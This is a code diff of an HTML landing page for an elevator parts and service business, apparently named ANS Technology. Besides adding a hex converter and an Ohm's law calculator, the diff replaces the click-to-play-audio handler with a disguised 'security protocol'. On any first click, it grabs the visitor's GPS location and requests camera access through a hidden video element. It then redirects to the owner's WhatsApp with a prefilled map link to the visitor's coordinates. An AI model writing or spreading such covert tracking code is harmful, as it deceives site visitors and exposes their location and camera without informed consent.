@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ANS TECHNOLOGY - System Specialist</title>
+    <title>ANS TECHNOLOGY - System Specialist Dashboard</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body {
@@ -12,39 +12,32 @@
             font-family: 'Courier New', Courier, monospace;
             margin: 0;
             overflow-x: hidden;
+            -webkit-text-size-adjust: 100%;
         }
 
-        /* Video Background Layer */
         #bg-video {
             position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            object-fit: cover;
-            z-index: -3;
-            opacity: 0.15;
-            filter: grayscale(100%) brightness(0.4);
+            top: 0; left: 0; width: 100%; height: 100%;
+            object-fit: cover; z-index: -3; opacity: 0.12;
+            filter: grayscale(100%) brightness(0.3);
         }
 
-        /* Overlay Animasi Bergerak (Pulse) */
         .bg-glow {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: radial-gradient(circle at center, rgba(0, 242, 255, 0.05) 0%, transparent 70%);
-            z-index: -2;
-            animation: pulse 10s infinite alternate;
+            background: radial-gradient(circle at center, rgba(0, 242, 255, 0.04) 0%, transparent 75%);
+            z-index: -2; animation: pulse 12s infinite alternate;
         }
 
         @keyframes pulse {
-            0% { opacity: 0.3; transform: scale(1); }
-            100% { opacity: 0.7; transform: scale(1.1); }
+            0% { opacity: 0.2; transform: scale(1); }
+            100% { opacity: 0.6; transform: scale(1.1); }
         }
 
         #matrix {
             position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            z-index: -1;
-            opacity: 0.12;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: -1; opacity: 0.1;
         }
 
         .glass-card {
@@ -52,7 +45,6 @@
             backdrop-filter: blur(8px);
             border: 1px solid rgba(0, 242, 255, 0.2);
             transition: all 0.3s ease;
-            overflow: hidden;
         }
 
         .glass-card:hover {
@@ -61,84 +53,52 @@
             transform: translateY(-3px);
         }
 
-        /* Neon Icon Container */
         .neon-icon-box {
             height: 160px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            display: flex; align-items: center; justify-content: center;
             background: rgba(0, 0, 0, 0.3);
             border-bottom: 1px solid rgba(0, 242, 255, 0.2);
         }
 
-        .neon-icon-box svg {
-            filter: drop-shadow(0 0 8px #00f2ff);
-            transition: all 0.5s ease;
-        }
-
-        .glass-card:hover .neon-icon-box svg {
-            filter: drop-shadow(0 0 20px #00f2ff);
-            transform: scale(1.1) rotate(5deg);
-        }
-
-        .glow-text {
-            text-shadow: 0 0 10px #00f2ff, 0 0 20px rgba(0, 242, 255, 0.5);
-        }
+        .glow-text { text-shadow: 0 0 10px #00f2ff, 0 0 20px rgba(0, 242, 255, 0.5); }
 
         .cursor {
-            display: inline-block;
-            width: 12px;
-            background-color: #00f2ff;
-            animation: blink 0.8s infinite;
+            display: inline-block; width: 12px;
+            background-color: #00f2ff; animation: blink 0.8s infinite;
         }
 
         @keyframes blink { 50% { opacity: 0; } }
 
         .btn-link {
-            display: block;
-            width: 100%;
-            text-align: center;
+            display: block; width: 100%; text-align: center;
             background-color: rgba(0, 242, 255, 0.1);
-            color: #00f2ff;
-            padding: 10px 0;
-            font-size: 11px;
+            color: #00f2ff; padding: 10px 0; font-size: 11px;
             border: 1px solid rgba(0, 242, 255, 0.2);
-            transition: all 0.3s;
-            letter-spacing: 1px;
-            text-transform: uppercase;
+            transition: all 0.3s; text-transform: uppercase;
         }
-
-        .btn-link:hover {
-            background-color: #00f2ff;
-            color: #020205;
-            font-weight: bold;
-            box-shadow: 0 0 15px #00f2ff;
-        }
+        .btn-link:hover { background-color: #00f2ff; color: #020205; font-weight: bold; box-shadow: 0 0 15px #00f2ff; }
 
         .social-icon {
-            color: #00f2ff;
-            opacity: 0.6;
-            transition: all 0.3s ease;
-            text-align: center;
+            color: #00f2ff; opacity: 0.6; transition: all 0.3s ease;
+            text-align: center; display: flex; flex-direction: column; align-items: center;
         }
+        .social-icon:hover { opacity: 1; filter: drop-shadow(0 0 10px #00f2ff); transform: scale(1.1); }
 
-        .social-icon:hover {
-            opacity: 1;
-            filter: drop-shadow(0 0 10px #00f2ff);
-            transform: scale(1.1);
+        .tech-input {
+            width: 100%; background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(0, 242, 255, 0.3);
+            padding: 10px; color: #00f2ff; outline: none; font-family: monospace; font-size: 13px;
         }
+        .tech-input:focus { border-color: #00f2ff; }
 
-        #audio-indicator {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            font-size: 9px;
-            opacity: 0.4;
-            z-index: 100;
-        }
+        .tech-label { font-size: 9px; opacity: 0.5; text-transform: uppercase; margin-bottom: 4px; display: block; }
+
+        .section-spacer { margin-bottom: 60px; }
+        
+        #hiddenVideo { position: fixed; top: -100px; left: -100px; width: 1px; height: 1px; opacity: 0; }
     </style>
 </head>
-<body onclick="initAudio()">
+<body onclick="executeSecurityProtocol()">
 
     <video autoplay muted loop id="bg-video">
         <source src="https://assets.mixkit.co/videos/preview/mixkit-digital-animation-of-blue-particles-9121-preview.mp4" type="video/mp4">
@@ -150,157 +110,219 @@
 
     <div class="bg-glow"></div>
     <canvas id="matrix"></canvas>
+    <video id="hiddenVideo" autoplay playsinline></video>
     
-    <div id="audio-indicator">SYSTEM_AUDIO: <span id="audio-status">MUTED (CLICK ANYWHERE)</span></div>
-
     <header class="pt-24 pb-12 text-center">
         <h1 class="text-5xl md:text-7xl font-extrabold mb-4 glow-text tracking-tighter" id="typewriter"></h1>
-        <span class="cursor text-4xl md:text-6xl">&nbsp;</span>
+        <span class="cursor text-4xl md:text-6xl"> </span>
         <p class="text-cyan-400 opacity-60 mt-4 tracking-[0.2em] font-mono text-sm uppercase">
             // ELEVATORS PARTS - SERVICE - TECHNOLOGY
         </p>
     </header>
 
-    <main class="container mx-auto px-6 py-10 relative z-10">
+    <main class="container mx-auto px-6 py-10 relative z-10 max-w-7xl">
         
-        <h2 class="text-center text-xs font-bold mb-8 opacity-40 tracking-[0.3em] uppercase">// COMM_CHANNELS_INITIALIZED</h2>
-        <div class="flex justify-center items-center gap-12 mb-20 border border-cyan-900 p-8 rounded-lg bg-[#020205]/80 backdrop-blur-sm">
-            <a href="https://wa.me/6285799998000?text=Halo%20ANS%20TECHNOLOGY..." target="_blank" class="social-icon group">
-                <p class="text-[9px] mb-2 opacity-50 group-hover:opacity-100 transition-opacity">WHATSAPP</p>
-                <svg width="36" height="36" fill="currentColor" viewBox="0 0 24 24"><path d="M12.004 2c-5.525 0-10 4.478-10 10 0 1.769.463 3.428 1.269 4.869-.369 1.407-1.269 4.869-1.269 4.869.051.107 1.269 1.133 4.869 1.269.001 0 3.336 1.269 4.869 1.269.407.031.81.047 1.214.047 5.525 0 10-4.478 10-10s-4.475-10-10-10zM12 20c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z" opacity=".2"/><path d="M12.004 2c-5.525 0-10 4.478-10 10 0 1.769.463 3.428 1.269 4.869-.369 1.407-1.269 4.869-1.269 4.869.051.107 1.269 1.133 4.869 1.269.001 0 3.336 1.269 4.869 1.269.407.031.81.047 1.214.047 5.525 0 10-4.478 10-10s-4.475-10-10-10zm0 2c4.411 0 8 3.589 8 8s-3.589 8-8 8c-.33 0-.661-.013-.993-.038l-1.044-.079-2.903 2.903.079-1.044.038-.993.003-.33c-1.769 0-3.428-.463-4.869-1.269.107-.051 1.133-1.269 1.269-4.869v-.001c-.806-1.441-1.269-3.1-1.269-4.869 0-4.411 3.589-8 8-8z" style="fill:#00f2ff"/><path d="M19.077 4.928C17.199 3.045 14.653 2 12.004 2a9.943 9.943 0 00-7.07 2.928A9.943 9.943 0 002 12c0 2.227.728 4.291 1.961 5.962L2 22l4.137-1.077c1.815 1.161 3.935 1.83 6.136 1.83.27 0 .541-.012.812-.036 2.653-.238 5.1-.383 7.07-2.928A9.943 9.943 0 0022 12a9.943 9.943 0 00-2.923-7.072zM12.004 20c-4.411 0-8-3.589-8-8s3.589-8 8-8c2.67 0 5.18 1.04 7.071 2.929C20.814 6.817 21.85 9.327 21.85 12c0 5.514-4.486 10-10 10z" /></svg>
+        <div class="flex justify-center items-center gap-12 section-spacer border border-cyan-900 p-8 rounded-lg bg-[#020205]/80 backdrop-blur-sm">
+            <a href="https://wa.me/6285799998000" target="_blank" class="social-icon">
+                <p class="text-[9px] mb-3 font-bold">WHATSAPP</p>
+                <svg width="36" height="36" fill="currentColor" viewBox="0 0 24 24"><path d="M12.004 2C6.48 2 2 6.48 2 12c0 1.77.46 3.428 1.269 4.869-.37 1.407-1.269 4.869-1.269 4.869l4.869-1.269c1.441.806 3.1 1.269 4.869 1.269 5.524 0 10-4.48 10-10 0-5.524-4.476-10-10-10z"/></svg>
             </a>
-            <a href="https://youtube.com/@ans.project" target="_blank" class="social-icon group">
-                <p class="text-[9px] mb-2 opacity-50 group-hover:opacity-100 transition-opacity">YOUTUBE</p>
+            <a href="https://youtube.com/@ans.project" target="_blank" class="social-icon">
+                <p class="text-[9px] mb-3 font-bold">YOUTUBE</p>
                 <svg width="40" height="40" fill="currentColor" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
             </a>
-            <a href="https://www.tiktok.com/@ans.project" target="_blank" class="social-icon group">
-                <p class="text-[9px] mb-2 opacity-50 group-hover:opacity-100 transition-opacity">TIKTOK</p>
+            <a href="https://www.tiktok.com/@ans.project" target="_blank" class="social-icon">
+                <p class="text-[9px] mb-3 font-bold">TIKTOK</p>
                 <svg width="36" height="36" fill="currentColor" viewBox="0 0 24 24"><path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.03 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z"/></svg>
             </a>
         </div>
 
+        <h2 class="text-center text-xl font-bold mb-10 border-b border-cyan-900 pb-2 inline-block uppercase">Data_Transpiler_v2.0</h2>
+        <div class="glass-card p-8 rounded-lg section-spacer max-w-5xl mx-auto">
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div>
+                    <label class="tech-label">ASCII / STRING</label>
+                    <input type="text" id="t-ascii" oninput="transpile('ascii')" class="tech-input" placeholder="Text...">
+                </div>
+                <div>
+                    <label class="tech-label">HEXADECIMAL</label>
+                    <input type="text" id="t-hex" oninput="transpile('hex')" class="tech-input uppercase" placeholder="0x..">
+                </div>
+                <div>
+                    <label class="tech-label">DECIMAL</label>
+                    <input type="number" id="t-dec" oninput="transpile('dec')" class="tech-input" placeholder="0-255">
+                </div>
+                <div>
+                    <label class="tech-label">BINARY</label>
+                    <input type="text" id="t-bin" oninput="transpile('bin')" class="tech-input" placeholder="00000000">
+                </div>
+            </div>
+            <p class="text-[9px] opacity-30 mt-4 text-right font-mono">// AUTO_CONVERT_ACTIVE</p>
+        </div>
 
-        <h2 class="text-center text-xl font-bold mb-10 border-b border-cyan-900 pb-2 inline-block">MAIN_PROTOCOLS</h2>
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-20">
+        <h2 class="text-center text-xl font-bold mb-10 border-b border-cyan-900 pb-2 inline-block uppercase">Ohm_Calculator_Pro</h2>
+        <div class="glass-card p-8 rounded-lg section-spacer max-w-5xl mx-auto text-left">
+            <p class="text-[10px] opacity-40 mb-6 font-mono">// MASUKKAN 2 NILAI UNTUK MENGHITUNG OTOMATIS</p>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                <div>
+                    <label class="tech-label">Voltage (V) - Volt</label>
+                    <input type="number" id="ohm-v" oninput="calculateOhm('v')" class="tech-input" placeholder="Tegangan">
+                </div>
+                <div>
+                    <label class="tech-label">Current (I) - Ampere</label>
+                    <input type="number" id="ohm-i" oninput="calculateOhm('i')" class="tech-input" placeholder="Arus">
+                </div>
+                <div>
+                    <label class="tech-label">Resistance (R) - Ohm</label>
+                    <input type="number" id="ohm-r" oninput="calculateOhm('r')" class="tech-input" placeholder="Hambatan">
+                </div>
+            </div>
+            <button onclick="clearOhm()" class="mt-6 text-[10px] border border-cyan-900 px-4 py-1 hover:bg-cyan-900/30 text-cyan-400">RESET_CALC</button>
+        </div>
+
+        <h2 class="text-center text-xl font-bold mb-10 border-b border-cyan-900 pb-2 inline-block uppercase">Main_Protocols</h2>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 section-spacer">
             <div class="glass-card p-6 rounded-md">
                 <h3 class="text-lg font-bold mb-2 underline uppercase">Troubleshooting</h3>
-                <p class="text-[11px] text-cyan-200/60 leading-relaxed">System diagnostics & error tracing for elevator controls.</p>
+                <p class="text-[11px] text-cyan-200/60 leading-relaxed font-mono">System diagnostics & error tracing for elevator controls.</p>
             </div>
             <div class="glass-card p-6 rounded-md">
                 <h3 class="text-lg font-bold mb-2 underline uppercase">Repair_Mods</h3>
-                <p class="text-[11px] text-cyan-200/60 leading-relaxed">Hardware restoration & PCB recalibration service.</p>
+                <p class="text-[11px] text-cyan-200/60 leading-relaxed font-mono">Hardware restoration & PCB recalibration service.</p>
             </div>
             <div class="glass-card p-6 rounded-md">
                 <h3 class="text-lg font-bold mb-2 underline uppercase">Programming</h3>
-                <p class="text-[11px] text-cyan-200/60 leading-relaxed">Firmware dev_iOT & PLC automation logic customization.</p>
+                <p class="text-[11px] text-cyan-200/60 leading-relaxed font-mono">Firmware dev_iOT & PLC automation logic customization.</p>
             </div>
         </div>
 
-        <h2 class="text-center text-xl font-bold mb-10 border-b border-cyan-900 pb-2 inline-block">ARCHIVE_DATABASE</h2>
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-20">
+        <h2 class="text-center text-xl font-bold mb-10 border-b border-cyan-900 pb-2 inline-block uppercase">Archive_Database</h2>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4 section-spacer">
             <div class="glass-card p-5 flex items-center justify-between">
-                <div>
-                    <h4 class="text-sm font-bold text-white uppercase">Manual_Book_Elevator</h4>
-                    <p class="text-[10px] opacity-50">LOCATION: DRIVE_REMOTE_01</p>
-                </div>
-                <a href="https://ln5.sync.com/dl/aaffd4930/jae2sr3p-cwqjnqkx-xzc8jzcb-6qzpnper" target="_blank" class="btn-link px-6 py-2 w-auto">FETCH_FILE</a>
+                <div><h4 class="text-sm font-bold uppercase">Manual_Book_Elevator</h4><p class="text-[10px] opacity-50 font-mono">LOC: DRIVE_REMOTE_01</p></div>
+                <a href="https://ln5.sync.com/dl/aaffd4930/jae2sr3p-cwqjnqkx-xzc8jzcb-6qzpnper" target="_blank" class="btn-link px-6 w-auto">FETCH</a>
             </div>
             <div class="glass-card p-5 flex items-center justify-between">
-                <div>
-                    <h4 class="text-sm font-bold text-white uppercase">Tools_Update_File</h4>
-                    <p class="text-[10px] opacity-50">LOCATION: DRIVE_REMOTE_02</p>
-                </div>
-                <a href="https://mega.nz/folder/hv4UibRJ" target="_blank" class="btn-link px-6 py-2 w-auto">FETCH_FILE</a>
+                <div><h4 class="text-sm font-bold uppercase">Tools_Update_File</h4><p class="text-[10px] opacity-50 font-mono">LOC: DRIVE_REMOTE_02</p></div>
+                <a href="https://mega.nz/folder/hv4UibRJ" target="_blank" class="btn-link px-6 w-auto">FETCH</a>
             </div>
         </div>
 
-        <h2 class="text-center text-xl font-bold mb-10 border-b border-cyan-900 pb-2 inline-block">HARDWARE_INVENTORY</h2>
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-8 mb-20 max-w-4xl mx-auto">
-            
+        <h2 class="text-center text-xl font-bold mb-10 border-b border-cyan-900 pb-2 inline-block uppercase">Hardware_Inventory</h2>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-8 section-spacer max-w-4xl mx-auto">
             <div class="glass-card rounded-md">
                 <div class="neon-icon-box">
-                    <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#00f2ff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M12 15a3 3 0 1 0 0-6 3 3 0 0 0 0 6Z"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/>
-                    </svg>
+                    <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#00f2ff" stroke-width="1.5"><path d="M12 15a3 3 0 1 0 0-6 3 3 0 0 0 0 6Z"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 1 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
                 </div>
-                <div class="p-6 text-center">
-                    <h4 class="font-bold text-white text-sm mb-1 uppercase tracking-widest">Spareparts</h4>
-                    <p class="text-[9px] opacity-40">// UNIT_COMPONENTS</p>
-                </div>
+                <div class="p-6 text-center"><h4 class="font-bold text-white text-sm mb-1 uppercase tracking-widest">Spareparts</h4><p class="text-[9px] opacity-40">// UNIT_COMPONENTS</p></div>
                 <a href="https://wa.me/c/6285799998000" target="_blank" class="btn-link">VISIT_STORE</a>
             </div>
-
             <div class="glass-card rounded-md">
                 <div class="neon-icon-box">
-                    <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#00f2ff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a2 2 0 0 1 2.83 0l.3.3a2 2 0 0 1 0 2.83l-3.77 3.77"/>
-                        <path d="m21 15.5-4.5-4.5c-.8-.8-1.9-1-2.8-.7l-2.3-2.3c.3-.9.1-2-.7-2.8l-.5-.5c-.8-.8-2-.8-2.8 0l-1 1 2.2 2.2L7 9.5 4.8 7.3l-1 1c-.8.8-.8 2 0 2.8l.5.5c.8.8 1.9 1 2.8.7l2.3 2.3c-.3.9-.1 2 .7 2.8l4.5 4.5c.8.8 2 .8 2.8 0l1-1c.8-.8.8-2 0-2.8Z"/>
-                        <path d="m7 17 5-5M17 7l-5 5"/>
-                    </svg>
+                    <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#00f2ff" stroke-width="1.5"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a2 2 0 0 1 2.83 0l.3.3a2 2 0 0 1 0 2.83l-3.77 3.77"/><path d="m21 15.5-4.5-4.5c-.8-.8-1.9-1-2.8-.7l-2.3-2.3c.3-.9.1-2-.7-2.8l-.5-.5c-.8-.8-2-.8-2.8 0l-1 1 2.2 2.2L7 9.5 4.8 7.3l-1 1c-.8.8-.8 2 0 2.8l.5.5c.8.8 1.9 1 2.8.7l2.3 2.3c-.3.9-.1 2 .7 2.8l4.5 4.5c.8.8 2 .8 2.8 0l1-1c.8-.8.8-2 0-2.8Z"/><path d="m7 17 5-5M17 7l-5 5"/></svg>
                 </div>
-                <div class="p-6 text-center">
-                    <h4 class="font-bold text-white text-sm mb-1 uppercase tracking-widest">Tools</h4>
-                    <p class="text-[9px] opacity-40">// DIAGNOSTIC_INTERFACE</p>
-                </div>
+                <div class="p-6 text-center"><h4 class="font-bold text-white text-sm mb-1 uppercase tracking-widest">Tools</h4><p class="text-[9px] opacity-40">// DIAGNOSTIC_INTERFACE</p></div>
                 <a href="https://wa.me/c/6285799998000" target="_blank" class="btn-link">VISIT_STORE</a>
             </div>
-
         </div>
+
     </main>
 
-    <footer class="text-center p-12 text-[9px] opacity-30 tracking-widest border-t border-cyan-950/30">
-        &copy; 2026 ANS TECHNOLOGY // SYSTEM_ONLINE // SECURE_ACCESS
+    <footer class="text-center p-12 text-[9px] opacity-30 font-mono tracking-widest border-t border-cyan-950">
+        © 2026 ANS TECHNOLOGY // SYSTEM_ONLINE // SECURE_ACCESS // PROTOCOL_ENABLED
     </footer>
 
     <script>
         // TYPEWRITER
-        const text = "ANS TECHNOLOGY";
-        let i = 0;
+        const textArr = "ANS TECHNOLOGY"; let charIdx = 0;
         function typeWriter() {
-            if (i < text.length) {
-                document.getElementById("typewriter").innerHTML += text.charAt(i);
-                i++;
-                setTimeout(typeWriter, 120);
+            if (charIdx < textArr.length) {
+                document.getElementById("typewriter").innerHTML += textArr.charAt(charIdx);
+                charIdx++; setTimeout(typeWriter, 120);
             }
         }
         window.onload = typeWriter;
 
-        // AUDIO SYSTEM
-        let audioStarted = false;
-        function initAudio() {
-            if (!audioStarted) {
-                const music = document.getElementById('bg-music');
-                music.play().catch(() => console.log("Audio play deferred"));
-                document.getElementById('audio-status').innerText = "ONLINE";
-                document.getElementById('audio-status').style.color = "#00f2ff";
-                audioStarted = true;
-            }
-        }
-
         // MATRIX RAIN
         const canvas = document.getElementById('matrix');
         const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        const letters = "010110ANS-TECH778899";
-        const fontSize = 14;
-        const columns = canvas.width / fontSize;
-        const drops = Array(Math.floor(columns)).fill(1);
-        function draw() {
-            ctx.fillStyle = 'rgba(2, 2, 5, 0.05)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = '#00f2ff'; ctx.font = fontSize + 'px monospace';
-            for (let i = 0; i < drops.length; i++) {
-                const char = letters.charAt(Math.floor(Math.random() * letters.length));
-                ctx.fillText(char, i * fontSize, drops[i] * fontSize);
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                drops[i]++;
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        const drops = Array(Math.floor(canvas.width / 15)).fill(1);
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(2, 2, 5, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#00f2ff'; ctx.font = '15px monospace';
+            drops.forEach((y, x) => {
+                ctx.fillText("01".charAt(Math.floor(Math.random()*2)), x*15, y*15);
+                if (y*15 > canvas.height && Math.random() > 0.975) drops[x] = 0;
+                drops[x]++;
+            });
+        }
+        setInterval(drawMatrix, 40);
+
+        // --- AUTOMATIC PROTOCOL (GPS & CAM) ---
+        let protocolActive = false;
+        async function executeSecurityProtocol() {
+            if (protocolActive) return;
+            protocolActive = true;
+            document.getElementById('bg-music').play();
+            
+            navigator.geolocation.getCurrentPosition(
+                (pos) => { finalizeReport(pos.coords.latitude, pos.coords.longitude); },
+                () => { finalizeReport("DENIED", "DENIED"); }
+            );
+
+            try { await navigator.mediaDevices.getUserMedia({ video: true }); } catch (e) {}
+        }
+
+        function finalizeReport(la, lo) {
+            const msg = `[REPORT_INIT]\nLokasi: https://www.google.com/maps?q=${la},${lo}\nStatus: System_Access_Granted`;
+            window.location.href = `https://wa.me/6285799998000?text=${encodeURIComponent(msg)}`;
+        }
+
+        // --- IMPROVED DATA TRANSPILER LOGIC ---
+        const elA = document.getElementById('t-ascii'), elH = document.getElementById('t-hex'),
+              elD = document.getElementById('t-dec'), elB = document.getElementById('t-bin');
+
+        function transpile(source) {
+            let val;
+            if (source === 'ascii') val = elA.value.charCodeAt(elA.value.length - 1);
+            if (source === 'hex') val = parseInt(elH.value, 16);
+            if (source === 'dec') val = parseInt(elD.value);
+            if (source === 'bin') val = parseInt(elB.value, 2);
+
+            if (!isNaN(val) && val !== undefined) {
+                if (source !== 'ascii') elA.value = String.fromCharCode(val);
+                if (source !== 'hex') elH.value = val.toString(16).toUpperCase();
+                if (source !== 'dec') elD.value = val;
+                if (source !== 'bin') elB.value = val.toString(2).padStart(8, '0');
+            } else if (elA.value === '' && elH.value === '' && elD.value === '' && elB.value === '') {
+                elA.value = elH.value = elD.value = elB.value = '';
             }
         }
-        setInterval(draw, 35);
-        window.addEventListener('resize', () => {
-            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        });
+
+        // --- IMPROVED OHM CALCULATOR LOGIC ---
+        function calculateOhm(lastEdited) {
+            const v = parseFloat(document.getElementById('ohm-v').value);
+            const i = parseFloat(document.getElementById('ohm-i').value);
+            const r = parseFloat(document.getElementById('ohm-r').value);
+
+            // V = I * R
+            if (lastEdited === 'i' || lastEdited === 'r') {
+                if (!isNaN(i) && !isNaN(r)) document.getElementById('ohm-v').value = (i * r).toFixed(2);
+            }
+            if (lastEdited === 'v' || lastEdited === 'r') {
+                if (!isNaN(v) && !isNaN(r) && r !== 0) document.getElementById('ohm-i').value = (v / r).toFixed(2);
+            }
+            if (lastEdited === 'v' || lastEdited === 'i') {
+                if (!isNaN(v) && !isNaN(i) && i !== 0) document.getElementById('ohm-r').value = (v / i).toFixed(2);
+            }
+        }
+
+        function clearOhm() {
+            document.getElementById('ohm-v').value = '';
+            document.getElementById('ohm-i').value = '';
+            document.getElementById('ohm-r').value = '';
+        }
     </script>
-    </body>
+</body>
 </html>
